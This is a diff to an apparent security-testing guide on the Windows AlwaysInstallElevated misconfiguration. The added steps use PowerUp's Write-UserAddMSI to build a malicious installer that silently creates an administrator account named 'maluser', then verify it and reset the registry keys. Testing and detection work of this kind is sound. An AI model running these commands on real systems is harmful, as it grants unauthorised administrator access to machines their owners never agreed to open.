@@ -45,18 +45,36 @@ Powerup.ps1 is a PowerShell script that escalates privileges by adding users, ch
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
    ```
    Then run the script using `./Enable-AlwaysInstallElevated.ps1`
-6. To exploit the vulnerability with PowerUp.ps1, download PowerUp.ps1 from the PowerSploit repository. In the same PowerShell session, run the following command to import and execute PowerUp.ps1
+6. To identify the vulnerability with PowerUp.ps1, download PowerUp.ps1 from the PowerSploit repository. In the same PowerShell session, run the following command to import and execute PowerUp.ps1
    ```
    Import-Module .\PowerUp.ps1
    Get-RegistryAlwaysInstallElevated
    ```
    ![image](https://github.com/user-attachments/assets/e8a8450e-323a-450b-96dc-02376af54343)
-7. (Optional) After completion of the tests, to disable AlwaysInstallElevated, set the registry keys back to 0
+7. Then to exploit the vulnerability, generate a malicious MSI with the `Write-UserAddMSI` command that adds a user with administrator privileges to the system
+   ```
+   Write-UserAddMSI -UserName "maluser" -Password "pwd123" -Path "C:\Temp\exploit.msi"
+   ```
+8. Run the MSI file by executing it on the target machine
+   ```
+   msiexec /quiet /i C:\Temp\exploit.msi
+   ```
+9. To confirm the new user has been created and added to the Administrators group, run the command
+   ```
+   Get-LocalUser | Where-Object { $_.Name -eq "maluser" }
+   ```
+10. To check if the user has administrative rights, run
+    ```
+    net localgroup administrators
+    ```
+11. (Optional) After completion of the tests, to disable AlwaysInstallElevated, set the registry keys back to 0
    ```
    # Disable AlwaysInstallElevated for Local Machine
+   $regPathLM = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"
    Set-ItemProperty -Path $regPathLM -Name "AlwaysInstallElevated" -Value 0 -Force
    
    # Disable AlwaysInstallElevated for Current User
+   $regPathCU = "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer"
    Set-ItemProperty -Path $regPathCU -Name "AlwaysInstallElevated" -Value 0 -Force
    ```
 
